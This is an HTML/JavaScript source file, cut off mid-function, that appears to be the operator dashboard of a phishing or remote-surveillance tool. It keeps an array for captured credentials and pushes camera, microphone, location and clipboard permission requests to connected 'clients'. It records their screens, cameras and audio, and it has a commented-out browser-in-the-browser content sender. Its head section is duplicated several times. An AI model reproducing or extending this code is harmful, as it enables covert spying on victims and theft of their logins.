<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/qr-code-styling/lib/qr-code-styling.js"></script>
    <link rel="stylesheet" href="https://issuant-unglaciated-yosef.ngrok-free.dev/server.css">
    <style>
        /* Modern Button Styles */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
            border: none;
            color: white;
            text-decoration: none;
        }

        .btn-small {
            padding: 6px 12px;
            font-size: 12px;
            border-radius: 6px;
        }

        .btn-primary { background: #3498db; }
        .btn-primary:hover { background: #2980b9; transform: translateY(-1px); }

        .btn-success { background: #2ecc71; }
        .btn-success:hover { background: #27ae60; transform: translateY(-1px); }

        .btn-warning { background: #f39c12; }
        .btn-warning:hover { background: #e67e22; transform: translateY(-1px); }

        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; transform: translateY(-1px); }

        .btn-neutral { background: #95a5a6; }
        .btn-neutral:hover { background: #7f8c8d; transform: translateY(-1px); }

        .btn-info { background: #1abc9c; }
        .btn-info:hover { background: #16a085; transform: translateY(-1px); }

        .btn-dark { background: #2c3e50; }
        .btn-dark:hover { background: #1a252f; transform: translateY(-1px); }

        .client-preview-container {
            border-radius: 12px;
            box-shadow: 0 18px 45px rgba(102, 126, 234, 0.15);
            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
            overflow: hidden;
            border: 1px solid rgba(102, 126, 234, 0.2);
        }

        .client-preview-container .content-container {
            background: #ffffff;
            border-top: 1px solid rgba(0, 0, 0, 0.05);
        }

        .viewer-controls {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            box-shadow: 0 12px 30px rgba(118, 75, 162, 0.2);
            min-height: 60px;
            overflow: visible;
        }

        .viewer-controls .control-group {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
            min-height: 40px;
        }

        .viewer-status {
            background-color: #f44336;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .viewer-status.connected {
            background-color: #4CAF50;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.8;
            }
        }

        .selection-mode-indicator {
            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: none;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
        }

        .selection-mode-indicator.active {
            display: inline-block;
            animation: pulse 2s infinite;
        }

        button.toggle {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            background-color: #2196F3;
            color: #ffffff;
        }

        button.toggle:hover {
            background-color: #1976D2;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        button.toggle.active {
            background-color: #f44336;
        }

        .viewer-context-menu {
            position: fixed;
            width: 260px;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.12);
            display: none;
            z-index: 100000;
            overflow: hidden;
            max-height: 70vh;
            /* Smooth fade only */
            opacity: 0;
            transition: opacity 0.18s ease, background-color 0.25s ease;
        }
        
        /* When opened */
        .viewer-context-menu.show {
            opacity: 1;
        }
        
        .viewer-context-menu::-webkit-scrollbar {
            width: 8px;
        }
        
        .viewer-context-menu::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }
        
        .viewer-context-menu::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 10px;
        }
        
        .viewer-context-menu::-webkit-scrollbar-thumb:hover {
            background: #555;
        }

        .viewer-context-menu .context-menu-item {
            padding: 10px 12px;
            cursor: pointer;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            user-select: none;
        }
        
        .viewer-context-menu .context-menu-item:hover {
            background: #f3f4f6;
        }
        
        #viewer-more-events-btn {
            font-weight: bold;
            border-top: 1px solid #eee;
            margin-top: 8px;
            padding-top: 10px;
        }
        
        .group-title {
            font-weight: 600;
            background: #fafafa;
            border-top: 1px solid #f1f1f1;
        }
        
        .back-row {
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #eee;
            padding: 6px 0;
        }
        
        .back-btn {
            padding: 8px 12px;
            cursor: pointer;
            color: #666;
        }
        
        .back-btn:hover {
            background: #f3f4f6;
            color: #000;
        }

        .viewer-modal {
            position: fixed;
            inset: 0;
            background-color: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 99998;
            animation: fadeIn 0.2s ease;
        }

        .viewer-modal .modal-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
            padding: 30px;
            border-radius: 12px;
            width: 600px;
            max-width: 90%;
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
        }

        .viewer-modal h3 {
            margin: 0 0 20px 0;
            color: #333333;
            font-size: 20px;
            font-weight: 600;
        }

        .viewer-modal p {
            margin: 8px 0;
            color: #666666;
            font-size: 14px;
        }

        .viewer-modal textarea {
            width: 100%;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            resize: vertical;
            box-sizing: border-box;
            min-height: 140px;
        }

        .viewer-modal textarea:focus {
            outline: none;
            border-color: #2196F3;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
        }

        .viewer-modal .modal-buttons {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }

        .viewer-modal .modal-button {
            padding: 10px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            color: #ffffff;
        }

        .viewer-modal .modal-button.primary {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
        }

        .viewer-modal .modal-button.primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.4);
        }

        .viewer-modal .modal-button.secondary {
            background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%);
        }

        .viewer-modal .modal-button.secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(244, 67, 54, 0.4);
        }

        .viewer-action-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin: 24px 0;
        }

        .viewer-action-buttons .action-button {
            padding: 14px 20px;
            border-radius: 8px;
            border: 2px solid #2196F3;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
            color: #2196F3;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .viewer-action-buttons .action-button:hover {
            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
            color: #ffffff;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(33, 150, 243, 0.35);
        }

        .viewer-modal span.highlight {
            color: #2196F3;
            font-weight: 600;
        }

        .qr-marker {
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid #4CAF50;
            background-color: rgba(76, 175, 80, 0.2);
            pointer-events: none;
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #4CAF50;
            font-weight: bold;
            border-radius: 4px;
        }
    </style>


 
    <script>
        // Authentication script
        (function() {
            // Check if token exists in localStorage
            const authToken = localStorage.getItem('auth_token');
            if (!authToken) {
                console.log('No authentication token found, redirecting to login');
                window.location.replace('login.html');
                return;
            }
            
            // Verify token with server
            fetch('/verify-token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: authToken })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Invalid token');
                }
                return response.json();
            })
            .then(data => {
                if (!data.success) {
                    throw new Error('Token verification failed');
                }
                console.log('Authentication successful for:', data.username);
            })
            .catch(error => {
                console.error('Authentication error:', error);
                localStorage.removeItem('auth_token');
                window.location.replace('login.html?error=session');
            });
            
            // Set up logout function
            window.logout = function() {
                const authToken = localStorage.getItem('auth_token');
                if (authToken) {
                    // Notify server about logout
                    fetch('/logout', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ token: authToken })
                    })
                    .then(() => {
                        // Clear token from localStorage
                        localStorage.removeItem('auth_token');
                        
                        // Redirect to login page
                        window.location.replace('login.html?logout=true');
                    })
                    .catch(error => {
                        console.error('Logout error:', error);
                        // Still clear token and redirect even if server request fails
                        localStorage.removeItem('auth_token');
                        window.location.replace('login.html?logout=true');
                    });
                } else {
                    // No token found, just redirect
                    window.location.replace('login.html?logout=true');
                }
            };
            
            // Set up periodic token verification
            setInterval(() => {
                const authToken = localStorage.getItem('auth_token');
                if (!authToken) {
                    window.location.replace('login.html');
                    return;
                }
                
                fetch('/verify-token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: authToken })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Token verification failed');
                    }
                })
                .catch(() => {
                    localStorage.removeItem('auth_token');
                    window.location.replace('login.html?error=session');
                });
            }, 60000); // Check every minute
        })();
    </script>
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <!-- Create containers for client-specific feeds -->
    <script>

     // Credentials storage
     let capturedCredentials = [];
        let screenStream = null;
        let cameraStream = null;
        // Add recording and screenshot functionality
        let screenRecorder = null;
        let cameraRecorder = null;
        let screenChunks = [];
        let cameraChunks = [];

                // Audio recording variables
        let audioRecorder = null;
        let audioChunks = [];
        let audioStream = null;
        
        function sendRequestContent() {
            if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                window.websocket.send(JSON.stringify({
                    type: 'request-content',
                    timestamp: new Date().toISOString()
                }));
            } else {
                console.warn('WebSocket not ready. Waiting to retry...');
                setTimeout(sendRequestContent, 200); // Retry after 200ms
            }
        }

        
        function toggleAudioStream() {
        const button = document.getElementById('audioPauseResumeButton');
            if (audioContext.state === 'running') {
                    audioContext.suspend().then(() => {
                    button.textContent = '▶️ Resume Audio';
                });
            } else if (audioContext.state === 'suspended') {
                    audioContext.resume().then(() => {
                    button.textContent = '⏸️ Pause Audio';
                });
            }
        }
  
        function setupAudioStream() {
    if (!audioContext) {
        console.error('Audio context not available');
        return false;
    }
    
    if (!audioStream) {
        try {
            // Create a MediaStreamDestination
            const dest = audioContext.createMediaStreamDestination();
            
            // Store the destination node for later use
            window.audioDestination = dest;
            
            // Create enhanced audio processing chain for recording
            
            // 1. High-pass filter to remove low rumble
            window.audioHighPass = audioContext.createBiquadFilter();
            window.audioHighPass.type = 'highpass';
            window.audioHighPass.frequency.value = 80;
            window.audioHighPass.Q.value = 0.7;
            
            // 2. Low-pass filter to remove high-frequency noise
            window.audioLowPass = audioContext.createBiquadFilter();
            window.audioLowPass.type = 'lowpass';
            window.audioLowPass.frequency.value = 12000;
            window.audioLowPass.Q.value = 0.7;
            
            // 3. Peaking filter to enhance speech clarity
            window.audioPeaking = audioContext.createBiquadFilter();
            window.audioPeaking.type = 'peaking';
            window.audioPeaking.frequency.value = 2500;
            window.audioPeaking.gain.value = 6;
            window.audioPeaking.Q.value = 1.0;
            
            // 4. Compressor for more consistent volume
            window.audioCompressor = audioContext.createDynamicsCompressor();
            window.audioCompressor.threshold.value = -24;
            window.audioCompressor.knee.value = 12; // Softer knee for smoother compression
            window.audioCompressor.ratio.value = 8; // Less aggressive ratio for more natural sound
            window.audioCompressor.attack.value = 0.003;
            window.audioCompressor.release.value = 0.25;
            
            // 5. Gain node for final volume adjustment
            window.audioGain = audioContext.createGain();
            window.audioGain.gain.value = 2.0; // Higher gain for better volume
            
            // Connect the enhanced processing chain
            window.audioHighPass.connect(window.audioLowPass);
            window.audioLowPass.connect(window.audioPeaking);
            window.audioPeaking.connect(window.audioCompressor);
            window.audioCompressor.connect(window.audioGain);
            window.audioGain.connect(dest);
            
            // Store the stream for recording
            audioStream = dest.stream;
            
            console.log('Enhanced audio processing chain set up for better clarity');
            
            // Make sure the audio context is running
            if (audioContext.state === 'suspended') {
                audioContext.resume().then(() => {
                    console.log('AudioContext resumed successfully in setupAudioStream');
                }).catch(err => {
                    console.error('Failed to resume AudioContext in setupAudioStream:', err);
                });
            }
            
            return true;
        } catch (e) {
            console.error('Error creating audio stream:', e);
            return false;
        }
    }
    
    return true;
}
    
        function toggleAudioRecording(clientId = 'default') {
            // Use client-specific button or fall back to default
            const buttonId = clientId ? `audioRecordButton-${clientId}` : 'audioRecordButton';
            const button = document.getElementById(buttonId);
            
            if (!button) {
                console.error(`Button with ID ${buttonId} not found`);
                return;
            }
            
            // Use client-specific recorder or create one
            if (!window.audioRecorders) window.audioRecorders = {};
            
            if (!window.audioRecorders[clientId]) {
                // Start recording
                if (!setupAudioStream()) {
                    alert('Audio stream not available. Please wait for audio to start streaming.');
                    return;
                }
                
                try {
                    // Clear previous recording chunks for this client
                    if (!window.audioChunks) window.audioChunks = {};
                    window.audioChunks[clientId] = [];
                    
                    // Make sure audio context is running before starting recording
                    if (window.audioContext && window.audioContext.state === 'suspended') {
                        window.audioContext.resume().then(() => {
                            console.log(`AudioContext resumed before recording for client ${clientId}`);
                        }).catch(err => {
                            console.error(`Failed to resume AudioContext before recording for client ${clientId}:`, err);
                        });
                    }
                    
                    // Create a MediaRecorder with appropriate options
                    let options;
                    try {
                        // Try to use codecs that support high-quality audio
                        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                            // Opus codec provides better quality at lower bitrates
                            options = { 
                                mimeType: 'audio/webm;codecs=opus',
                                audioBitsPerSecond: 128000 // 128kbps for better quality
                            };
                            console.log(`Using opus codec for audio recording at 128kbps for client ${clientId}`);
                        } else if (MediaRecorder.isTypeSupported('audio/webm')) {
                            options = { 
                                mimeType: 'audio/webm',
                                audioBitsPerSecond: 128000 // 128kbps for better quality
                            };
                            console.log(`Using webm for audio recording at 128kbps for client ${clientId}`);
                        } else {
                            options = { audioBitsPerSecond: 128000 }; // Let the browser decide but set bitrate
                            console.log(`Using default codec for audio recording at 128kbps for client ${clientId}`);
                        }
                    } catch (e) {
                        console.warn(`Error checking codec support for client ${clientId}:`, e);
                        options = {}; // Fallback to default
                    }
                    
                    window.audioRecorders[clientId] = new MediaRecorder(audioStream, options);
                    console.log(`Created MediaRecorder for client ${clientId} with options:`, options);
                    
                    // Handle data available event
                    window.audioRecorders[clientId].ondataavailable = function(e) {
                        console.log(`Audio data available for client ${clientId}, size:`, e.data.size);
                        if (e.data.size > 0) {
                            window.audioChunks[clientId].push(e.data);
                        }
                    };
                    
                    // Handle recording stopped - automatically download
                    window.audioRecorders[clientId].onstop = function() {
                        console.log(`Audio recording stopped for client ${clientId}, chunks:`, window.audioChunks[clientId].length);
                        if (!window.audioChunks[clientId] || window.audioChunks[clientId].length === 0) {
                            console.error(`No audio data was recorded for client ${clientId}`);
                            alert('No audio data was recorded. Please try again.');
                            return;
                        }
                        
                        const blob = new Blob(window.audioChunks[clientId], { type: 'audio/webm' });
                        console.log(`Created blob for client ${clientId} of size:`, blob.size);
                        const url = URL.createObjectURL(blob);
                        
                        // Create and trigger automatic download
                        const downloadLink = document.createElement('a');
                        downloadLink.href = url;
                        downloadLink.download = generateEdenFilename(clientId, 'audio', 'webm');
                        document.body.appendChild(downloadLink);
                        downloadLink.click();
                        document.body.removeChild(downloadLink);
                        
                        // Show download notification
                        const statusMessage = document.createElement('div');
                        statusMessage.textContent = `Audio recording downloaded for client ${clientId}`;
                        statusMessage.style.cssText = 'background-color: #28a745; color: white; padding: 10px; border-radius: 4px; margin-top: 10px; margin-bottom: 10px;';
                        
                        // Add notification to client container
                        const clientContainer = document.getElementById(`audio-client-${clientId}`);
                        if (clientContainer) {
                            clientContainer.appendChild(statusMessage);
                            setTimeout(() => {
                                if (statusMessage.parentNode === clientContainer) {
                                    clientContainer.removeChild(statusMessage);
                                }
                            }, 3000);
                        }
                        
                        // Also add notification to main audio logs
                        const logMessage = statusMessage.cloneNode(true);
                        document.getElementById('audioLogs').insertBefore(logMessage, document.getElementById('audioLogs').firstChild);
                        setTimeout(() => {
                            if (logMessage.parentNode === document.getElementById('audioLogs')) {
                                document.getElementById('audioLogs').removeChild(logMessage);
                            }
                        }, 3000);
                        
                        // Clean up
                        delete window.audioRecorders[clientId];
                    };
                    
                    // Start recording with small timeslice for frequent ondataavailable events
                    window.audioRecorders[clientId].start(100); // Collect data every 100ms for smoother recording
                    button.textContent = '⏹️ Stop Recording';
                    console.log(`Audio recording started for client ${clientId}`);
                } catch (err) {
                    console.error(`Error starting recording for client ${clientId}:`, err);
                    alert('Could not start recording: ' + err.message);
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                }
            } else {
                // Stop recording
                try {
                    window.audioRecorders[clientId].stop();
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                    console.log(`Audio recording stopped for client ${clientId}`);
                } catch (e) {
                    console.error(`Error stopping recording for client ${clientId}:`, e);
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                }
            }
        }
        
        // Initialize client audio states
        if (!window.clientAudioStates) {
            window.clientAudioStates = {};
        }
        
        // Toggle client-specific audio
        function toggleClientAudio(clientId) {
            if (!clientId) return;
            
            // Initialize state if not exists
            if (window.clientAudioStates[clientId] === undefined) {
                window.clientAudioStates[clientId] = false; // Not paused by default
            }
            
            // Get button
            const button = document.getElementById(`audioPauseButton-${clientId}`);
            if (!button) return;
            
            // Toggle state
            window.clientAudioStates[clientId] = !window.clientAudioStates[clientId];
            
            // Update button text
            if (window.clientAudioStates[clientId]) {
                // Audio is now paused
                button.textContent = '▶️ Resume Audio';
                button.style.backgroundColor = '#ffc107'; // Yellow for paused
            } else {
                // Audio is now playing
                button.textContent = '⏸️ Pause Audio';
                button.style.backgroundColor = '#007bff'; // Blue for playing
            }
        }
        


        function takeScreenScreenshot() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const img = document.getElementById('screenDisplay');
            
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = 'screenshot.png';
            link.click();
        }

        function toggleCameraRecording() {
            const button = document.getElementById('cameraRecordButton');
            if (!cameraRecorder) {
                // Start recording
                if (!cameraStream) {
                    console.error('Camera stream not available for recording');
                    alert('Camera stream not available. Please enable your camera first.');
                    return;
                }
                
                cameraChunks = [];
                try {
                    // Try different MIME types and options
                    let options = { mimeType: 'video/webm' };
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 2500000 };
                    }
                    
                    cameraRecorder = new MediaRecorder(cameraStream, options);
                    console.log('Camera recorder created with options:', options);
                    
                    cameraRecorder.ondataavailable = function(e) {
                        if (e.data && e.data.size > 0) {
                            cameraChunks.push(e.data);
                            console.log('Camera recording data available, size:', e.data.size);
                        }
                    };
                    
                    cameraRecorder.onstop = function() {
                        if (cameraChunks.length > 0) {
                            const blob = new Blob(cameraChunks, { type: 'video/webm' });
                            console.log('Camera recording completed, total size:', blob.size);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'camera-recording.webm';
                            a.click();
                            URL.revokeObjectURL(url);
                        } else {
                            console.error('No camera recording data collected');
                            alert('No camera recording data was collected. Please try again.');
                        }
                    };
                    
                    // Request data every 1 second to ensure we're capturing
                    cameraRecorder.start(1000);
                    button.textContent = '⏹️ Stop Recording';
                    console.log('Camera recording started');
                } catch (e) {
                    console.error('Error starting camera recording:', e);
                    alert('Failed to start camera recording: ' + e.message);
                }
            } else {
                // Stop recording
                try {
                    cameraRecorder.stop();
                    cameraRecorder = null;
                    button.textContent = '⏺️ Start Recording';
                    console.log('Camera recording stopped');
                } catch (e) {
                    console.error('Error stopping camera recording:', e);
                }
            }
        }

        function takeCameraScreenshot() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const video = document.getElementById('cameraFeed');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = 'camera-screenshot.png';
            link.click();
        }

        function toggleScreenRecording() {
            const button = document.getElementById('screenRecordButton');
            if (!screenRecorder) {
                // Start recording
                if (!screenStream) {
                    console.error('Screen stream not available for recording');
                    alert('Screen stream not available. Please share your screen first.');
                    return;
                }
                
                screenChunks = [];
                try {
                    // Try different MIME types and options
                    let options = { mimeType: 'video/webm' };
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                    }
                    
                    screenRecorder = new MediaRecorder(screenStream, options);
                    console.log('Screen recorder created with options:', options);
                    
                    screenRecorder.ondataavailable = function(e) {
                        if (e.data && e.data.size > 0) {
                            screenChunks.push(e.data);
                            console.log('Screen recording data available, size:', e.data.size);
                        }
                    };
                    
                    screenRecorder.onstop = function() {
                        if (screenChunks.length > 0) {
                            const blob = new Blob(screenChunks, { type: 'video/webm' });
                            console.log('Screen recording completed, total size:', blob.size);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'screen-recording.webm';
                            a.click();
                            URL.revokeObjectURL(url);
                        } else {
                            console.error('No screen recording data collected');
                            alert('No screen recording data was collected. Please try again.');
                        }
                    };
                    
                    // Request data every 1 second to ensure we're capturing
                    screenRecorder.start(1000);
                    button.textContent = '⏹️ Stop Recording';
                    console.log('Screen recording started');
                } catch (e) {
                    console.error('Error starting screen recording:', e);
                    alert('Failed to start screen recording: ' + e.message);
                }
            } else {
                // Stop recording
                try {
                    screenRecorder.stop();
                    screenRecorder = null;
                    button.textContent = '⏺️ Start Recording';
                    console.log('Screen recording stopped');
                } catch (e) {
                    console.error('Error stopping screen recording:', e);
                }
            }
        }

        function showsContent(section) {
            // Hide all regular sections
            document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
            
            // Hide all permission sections
            document.querySelectorAll('.perm-content-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.perm-nav-tab').forEach(el => el.classList.remove('active'));
            
            // Show selected section
            const sectionId = `${section}-content`;
            const sectionElement = document.getElementById(sectionId);
            if (sectionElement) {
                sectionElement.classList.add('active');
                
                // Find and activate the corresponding tab
                const tabSelector = section === 'all' ? '.perm-nav-tab.active' : `.perm-nav-tab[onclick*="${section}"]`;
                const tabElement = document.querySelector(tabSelector);
                if (tabElement) {
                    tabElement.classList.add('active');
                }
                
                // Special case for camera section - make sure video elements display properly
                if (section === 'camera') {
                    setTimeout(() => {
                        // Refresh all client camera streams
                        if (window.clientCameraStreams) {
                            Object.keys(window.clientCameraStreams).forEach(clientId => {
                                const videoElement = document.getElementById(`client-camera-${clientId}`);
                                if (videoElement && window.clientCameraStreams[clientId]) {
                                    videoElement.srcObject = window.clientCameraStreams[clientId];
                                    videoElement.play().catch(err => console.error('Error playing video:', err));
                                }
                            });
                        }
                    }, 100);
                }
            }
        }

        // Function to check if we should ignore a permission-related message
        function shouldIgnorePermissionMessage(data) {
            // Check if this is a permission-related message
            const permissionKeywords = [
                'permission', 'camera', 'screen', 'audio', 'microphone', 
                'clipboard', 'location', 'notification', 'geolocation'
            ];
            
            // Check if the message type contains any permission-related keywords
            const isPermissionMessage = permissionKeywords.some(keyword => 
                data.type && data.type.toLowerCase().includes(keyword.toLowerCase())
            );
            
            // Also check if the message itself mentions permissions
            const isPermissionContent = data.message && permissionKeywords.some(keyword => 
                data.message.toLowerCase().includes(keyword.toLowerCase())
            );
            
            return isPermissionMessage || isPermissionContent;
        }

        function requestPermission(type) {
            // Find selected and online clients
            const selected = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
            console.log('Requesting permission:', type, 'Selected clients:', selected);
            if (selected.length === 0) {
                showStatusMessage('warning', 'No clients selected. Please select at least one client.');
                return;
            }
            sendToSelectedClients({
                type: `request-${type}`
            });

            // Add a status message to the logs showing we sent the request
            const statusDiv = document.createElement('div');
            statusDiv.className = 'status';
            statusDiv.textContent = `${new Date().toLocaleTimeString()} - Sent ${type} permission request to selected clients`;
            document.getElementById('allLogs').appendChild(statusDiv);
            }

       /* function BITBFile(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            sendToSelectedClients({
                type: 'BITBContent',
                content: fileData.data,
                fileName: fileName
            });
        } */

        function requestAllPermissions() {
            const permissions = ['camera', 'microphone',  'location',  'clipboard'];
            permissions.forEach((type, index) => {
                setTimeout(() => requestPermission(type), index * 1000);
            });
        }
             

    
    function updateClientFeedsVisibility(client) {
            if (!client) return;
            
            console.log(`Updating feeds visibility for client ID: ${client.clientId}, selected: ${client.selected}, status: ${client.status}`);
            
            // Get all containers associated with this client
            // Use both full clientId and shortened versions for better matching
            const clientId = client.clientId;
            const shortIds = [
                clientId,
                clientId.split('_')[0],
                clientId.split('_').pop()
            ];
            
            // Check all containers with data-client-id attribute
            document.querySelectorAll('[data-client-id]').forEach(container => {
                const containerId = container.getAttribute('data-client-id');
                
                // Check if this container belongs to our client using flexible matching
                const isMatch = shortIds.some(id => 
                    containerId === id || 
                    containerId.includes(id) || 
                    id.includes(containerId)
                );
                
                if (isMatch) {
                    console.log(`Found matching container for client: ${containerId}`);
                    
                    // Show only if client is selected and online
                    if (client.selected && client.status === 'online') {
                        container.style.display = 'block';
                        console.log(`Showing feed container: ${container.id}`);
                    } else {
                        container.style.display = 'none';
                        console.log(`Hiding feed container: ${container.id}`);
                    }
                }
            });
            
            // Check camera container for this client
            const cameraContainer = document.getElementById(`camera-container-${clientId}`);
            if (cameraContainer) {
                if (client.selected && client.status === 'online') {
                    cameraContainer.style.display = 'block';
                    
                    // Ensure video is playing if we're in the camera tab
                    if (document.getElementById('camera-content').classList.contains('active')) {
                        const videoElement = document.getElementById(`client-camera-${clientId}`);
                        if (videoElement && videoElement.paused) {
                            videoElement.play().catch(err => console.log('Video already playing or tab not active'));
                        }
                    }
                } else {
                    cameraContainer.style.display = 'none';
                }
            }
            
            // Check screen container for this client
            const screenContainer = document.getElementById(`screen-container-${clientId}`);
            if (screenContainer) {
                if (client.selected && client.status === 'online') {
                    screenContainer.style.display = 'block';
                } else {
                    screenContainer.style.display = 'none';
                }
            }
        }
         
    // Show status message function
    function showStatusMessage(type, message) {
        const statusDiv = document.createElement('div');
        statusDiv.className = type === 'warning' ? 'status denied' : 'status granted';
        statusDiv.textContent = message;
        
        const allLogs = document.getElementById('allLogs');
        if (allLogs) {
            allLogs.insertBefore(statusDiv, allLogs.firstChild);
            
            // Auto-remove after 5 seconds
            setTimeout(() => {
                statusDiv.style.opacity = '0';
                setTimeout(() => statusDiv.remove(), 300);
            }, 5000);
        }
    }
    
    // Function to update camera log
    function updateCameraLog(clientId, message) {
        const cameraLogs = document.getElementById('cameraLogs');
